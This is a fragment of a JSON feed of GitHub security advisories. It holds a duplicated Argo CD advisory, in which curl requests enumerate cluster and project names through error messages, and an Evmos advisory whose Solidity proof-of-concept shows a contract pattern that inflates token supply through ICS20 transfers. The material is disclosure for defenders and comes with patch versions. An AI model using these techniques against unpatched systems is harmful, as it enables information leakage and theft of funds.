            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>It’s possible for authenticated users to enumerate clusters by name by inspecting error messages:</p>\n<pre><code>$ curl -k 'https://localhost:8080/api/v1/clusters/in-cluster?id.type=name' -H \"Authorization: \nBearer $token\"\n{\"error\":\"permission denied: clusters, get, , sub: alice, iat: 2022-11-04T20:25:44Z\",\"code\":7,\"message\":\"permission denied: clusters, get, , sub: alice, iat: 2022-11-04T20:25:44Z\"}⏎                                 \n                                   \n$ curl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name' -H \"Authorizati\non: Bearer $token\"\n{\"error\":\"permission denied\",\"code\":7,\"message\":\"permission denied\"}\n</code></pre>\n<p>It’s also possible to enumerate the names of projects with project-scoped clusters if you know the names of the clusters.</p>\n<pre><code>curl -k 'https://localhost:8080/api/v1/clusters/in-cluster-project?id.type=name' -H \"Authorization: Bearer $token\"\n{\"error\":\"permission denied: clusters, get, default/, sub: alice, iat: 2022-11-04T20:25:44Z\",\"code\":7,\"message\":\"permission denied: clusters, get, default/, sub: alice, iat: 2022-11-04T20:25:44Z\"}\n\ncurl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name' -H \"Authorization: Bearer $token\"\n{\"error\":\"permission denied\",\"code\":7,\"message\":\"permission denied\"}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.3\nv2.10.12\nv2.9.17</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<p>Credits\nThis vulnerability was found &amp; reported by @crenshaw-dev (Michael Crenshaw)</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-3cqf-953p-h5cp\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-3cqf-953p-h5cp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36106\">https://nvd.nist.gov/vuln/detail/CVE-2024-36106</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/c2647055c261a550e5da075793260f6524e65ad9\">https://github.com/argoproj/argo-cd/commit/c2647055c261a550e5da075793260f6524e65ad9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3cqf-953p-h5cp\">https://github.com/advisories/GHSA-3cqf-953p-h5cp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3cqf-953p-h5cp",
            "title": "[github.com/argoproj/argo-cd] Argo-cd authenticated users can enumerate clusters by name",
            "date_modified": "2024-06-06T19:04:56.000Z",
            "date_published": "2024-06-06T19:04:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3cqf-953p-h5cp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>It’s possible for authenticated users to enumerate clusters by name by inspecting error messages:</p>\n<pre><code>$ curl -k 'https://localhost:8080/api/v1/clusters/in-cluster?id.type=name' -H \"Authorization: \nBearer $token\"\n{\"error\":\"permission denied: clusters, get, , sub: alice, iat: 2022-11-04T20:25:44Z\",\"code\":7,\"message\":\"permission denied: clusters, get, , sub: alice, iat: 2022-11-04T20:25:44Z\"}⏎                                 \n                                   \n$ curl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name' -H \"Authorizati\non: Bearer $token\"\n{\"error\":\"permission denied\",\"code\":7,\"message\":\"permission denied\"}\n</code></pre>\n<p>It’s also possible to enumerate the names of projects with project-scoped clusters if you know the names of the clusters.</p>\n<pre><code>curl -k 'https://localhost:8080/api/v1/clusters/in-cluster-project?id.type=name' -H \"Authorization: Bearer $token\"\n{\"error\":\"permission denied: clusters, get, default/, sub: alice, iat: 2022-11-04T20:25:44Z\",\"code\":7,\"message\":\"permission denied: clusters, get, default/, sub: alice, iat: 2022-11-04T20:25:44Z\"}\n\ncurl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name' -H \"Authorization: Bearer $token\"\n{\"error\":\"permission denied\",\"code\":7,\"message\":\"permission denied\"}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.3\nv2.10.12\nv2.9.17</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<p>Credits\nThis vulnerability was found &amp; reported by @crenshaw-dev (Michael Crenshaw)</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-3cqf-953p-h5cp\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-3cqf-953p-h5cp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36106\">https://nvd.nist.gov/vuln/detail/CVE-2024-36106</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/c2647055c261a550e5da075793260f6524e65ad9\">https://github.com/argoproj/argo-cd/commit/c2647055c261a550e5da075793260f6524e65ad9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3cqf-953p-h5cp\">https://github.com/advisories/GHSA-3cqf-953p-h5cp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3cqf-953p-h5cp",
            "title": "[github.com/argoproj/argo-cd] Argo-cd authenticated users can enumerate clusters by name",
            "date_modified": "2024-06-06T19:04:56.000Z",
            "date_published": "2024-06-06T19:04:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3cqf-953p-h5cp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><em>Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server.</em></p>\n<h3 id=\"details\">Details</h3>\n<p>We discovered a bug walking through how to liquid stake using Safe which itself is a contract. The bug only appears when there is a local state change together with an ICS20 transfer in the same function and uses the contract's balance, that is using the contract address as the <code>sender</code> parameter in an ICS20 transfer using the ICS20 precompile</p>\n<h3 id=\"proof-of-concept\">Proof of Concept</h3>\n<pre><code class=\"language-solidity\">// This function does not reduce the contract balance correctly but liquid stakes correctly \nfunction transfer(\n        string memory sourcePort,\n        string memory sourceChannel,\n        string memory denom,\n        uint256 amount,\n        string memory receiver,\n        string memory evmosReceiver\n    ) external returns (uint64 nextSequence) {\n        counter += 1; # Only happens when there is a local state update together with an ICS20 Transfer\n        Height memory timeoutHeight =  Height(100, 100);\n        string memory memo = buildLiquidStakeMemo(receiver, evmosReceiver);\n        return ICS20_CONTRACT.transfer(\n            sourcePort, \n            sourceChannel,\n            denom,\n            amount,\n            address(this), # this is the sender address which is the contract\n            receiver,\n            timeoutHeight,\n            0,\n            memo\n        );\n    }\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This is in essence the \"infinite money glitch\" allowing contracts to double the supply of Evmos after each transaction.</p>\n<h3 id=\"severity\">Severity</h3>\n<p>Based on <a href=\"https://immunefisupport.zendesk.com/hc/en-us/articles/13332717597585-Severity-Classification-System\">ImmuneFi Severity Classification System</a> the severity was evaluated to <code>Critical</code> since the attack could have lead to create new supply of EVMOS and therefore lead to Direct loss of funds's value.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has been patched in versions &gt;=V18.1.0. </p>\n<h2 id=\"for-more-information\">For more information</h2>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Reach out to the Core Team in <a href=\"https://discord.gg/evmos\">Discord</a>\nOpen a discussion in <a href=\"https://github.com/evmos/evmos/discussions\">evmos/evmos</a>\nEmail us at <a href=\"mailto:security@evmos.org\">security@evmos.org</a> for security questions</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-xgr7-jgq3-mhmc\">https://github.com/evmos/evmos/security/advisories/GHSA-xgr7-jgq3-mhmc</a></li>\n<li><a href=\"https://github.com/evmos/evmos/commit/478b7a62e7af57a70cf3a01126c7f5a89bee69d7\">https://github.com/evmos/evmos/commit/478b7a62e7af57a70cf3a01126c7f5a89bee69d7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37153\">https://nvd.nist.gov/vuln/detail/CVE-2024-37153</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xgr7-jgq3-mhmc\">https://github.com/advisories/GHSA-xgr7-jgq3-mhmc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xgr7-jgq3-mhmc",
            "title": "[github.com/evmos/evmos/v6] Contract balance not updating correctly after interchain transaction",
            "date_modified": "2024-06-06T21:32:48.000Z",
            "date_published": "2024-06-06T18:51:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xgr7-jgq3-mhmc"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}